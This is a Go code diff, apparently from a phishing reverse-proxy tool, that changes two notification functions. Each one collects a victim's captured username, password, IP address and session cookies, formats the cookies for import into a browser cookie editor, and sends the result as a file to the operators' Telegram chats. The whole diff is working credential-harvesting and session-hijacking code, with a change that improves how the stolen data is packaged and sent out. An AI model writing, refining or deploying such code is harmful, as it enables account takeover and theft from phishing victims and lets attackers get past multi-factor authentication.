@@ -889,18 +889,7 @@ func NotifySession(lureId int, phishlet, username, password, remoteAddr string, 
 		return
 	}
 
-	uname := username
-	if uname == "" {
-		uname = "—"
-	}
-	pass := password
-	if pass == "" {
-		pass = "—"
-	}
-
-	sessionVal := "N/A"
-
-	// build browser-extension cookie JSON
+	// build browser-extension cookie JSON with empty-value filtering
 	type browserCookie struct {
 		Path           string `json:"path"`
 		Domain         string `json:"domain"`
@@ -916,6 +905,10 @@ func NotifySession(lureId int, phishlet, username, password, remoteAddr string, 
 			domain = "." + domain
 		}
 		for _, ct := range tokenMap {
+			// Skip empty cookie values
+			if ct.Value == "" {
+				continue
+			}
 			expiry := ct.ExpiresAt
 			if expiry == 0 {
 				expiry = defaultExpiry
@@ -931,20 +924,22 @@ func NotifySession(lureId int, phishlet, username, password, remoteAddr string, 
 		}
 	}
 
-	cookieJSON := "[]"
+	// Create credentials info + cookie JSON for file
+	credInfo := fmt.Sprintf("Username: %s\nPassword: %s\nPhishlet: %s\nRemote IP: %s\n\n",
+		username, password, phishlet, remoteAddr)
+
+	fileContent := credInfo + "=== COOKIES (FOR COOKIE EDITOR) ===\n\n"
 	if len(cookies) > 0 {
-		if b, err2 := json.MarshalIndent(cookies, "", "    "); err2 == nil {
-			cookieJSON = string(b)
+		if b, err2 := json.MarshalIndent(cookies, "", "  "); err2 == nil {
+			fileContent += string(b)
 		}
+	} else {
+		fileContent += "[]"
 	}
 
-	msg := fmt.Sprintf(
-		"Username: %s\nPassword: %s\nSession: %s\n\nINFO.TXT\n\nConverted JSON:\n%s",
-		uname, pass, sessionVal, cookieJSON)
-
-	filename := fmt.Sprintf("session_%s.txt", time.Now().Format("20060102_150405"))
+	filename := fmt.Sprintf("cookies_%s.txt", time.Now().Format("20060102_150405"))
 	for chatId := range notifyChats {
-		GlobalBot.sendAsFile(chatId, filename, msg)
+		GlobalBot.sendAsFile(chatId, filename, fileContent)
 	}
 }
 
@@ -958,17 +953,7 @@ func NotifySessionFromDB(sess *database.Session) {
 		return
 	}
 
-	uname := sess.Username
-	if uname == "" {
-		uname = "—"
-	}
-	pass := sess.Password
-	if pass == "" {
-		pass = "—"
-	}
-
-	sessionVal := "N/A"
-
+	// Build cookie JSON with empty-value filtering
 	type browserCookie struct {
 		Path           string `json:"path"`
 		Domain         string `json:"domain"`
@@ -984,6 +969,10 @@ func NotifySessionFromDB(sess *database.Session) {
 			domain = "." + domain
 		}
 		for _, ct := range tokenMap {
+			// Skip empty cookie values
+			if ct.Value == "" {
+				continue
+			}
 			expiry := ct.ExpiresAt
 			if expiry == 0 {
 				expiry = defaultExpiry
@@ -999,19 +988,21 @@ func NotifySessionFromDB(sess *database.Session) {
 		}
 	}
 
-	cookieJSON := "[]"
+	// Create credentials info + cookie JSON for file
+	credInfo := fmt.Sprintf("Username: %s\nPassword: %s\nPhishlet: %s\nRemote IP: %s\n\n",
+		sess.Username, sess.Password, sess.Phishlet, sess.RemoteAddr)
+
+	fileContent := credInfo + "=== COOKIES (FOR COOKIE EDITOR) ===\n\n"
 	if len(cookies) > 0 {
-		if b, err := json.MarshalIndent(cookies, "", "    "); err == nil {
-			cookieJSON = string(b)
+		if b, err := json.MarshalIndent(cookies, "", "  "); err == nil {
+			fileContent += string(b)
 		}
+	} else {
+		fileContent += "[]"
 	}
 
-	msg := fmt.Sprintf(
-		"Username: %s\nPassword: %s\nSession: %s\n\nINFO.TXT\n\nConverted JSON:\n%s",
-		uname, pass, sessionVal, cookieJSON)
-
-	filename := fmt.Sprintf("session_%s.txt", time.Now().Format("20060102_150405"))
-	GlobalBot.sendAsFile(adminChatId, filename, msg)
+	filename := fmt.Sprintf("cookies_%s.txt", time.Now().Format("20060102_150405"))
+	GlobalBot.sendAsFile(adminChatId, filename, fileContent)
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
